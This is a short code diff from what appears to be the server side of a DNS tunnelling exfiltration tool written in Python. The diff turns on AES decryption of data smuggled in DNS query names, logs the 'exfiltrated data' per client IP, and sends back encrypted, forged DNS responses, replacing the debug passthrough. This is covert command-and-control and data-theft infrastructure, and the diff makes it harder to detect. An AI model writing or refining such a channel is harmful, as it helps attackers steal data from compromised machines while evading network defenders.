@@ -105,19 +105,19 @@ def handle_dns_packet(packet):
             encrypted_data = domain.replace(f"{DOMAIN}", "")
             
             # Debugging
-            decrypted_data = encrypted_data
-            print(f"decrypted after replacement: {decrypted_data}")
+            # decrypted_data = encrypted_data
+            # print(f"decrypted after replacement: {decrypted_data}")
             
-            # decrypted_data = decrypt_aes(encrypted_data, aes_key)
+            decrypted_data = decrypt_aes(encrypted_data, aes_key)
 
             if decrypted_data:
                 print(f"Exfiltrated data from {client_ip} (decrypted): {decrypted_data}")
                 log_client_data(client_ip, decrypted_data)
 
                 response_data = f"Received: {decrypted_data}"
-                
-                # encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
-                encrypted_response = response_data
+            
+                encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
+                # encrypted_response = response_data
 
                 forge_dns_response(packet, rdata=encrypted_response)
             else:
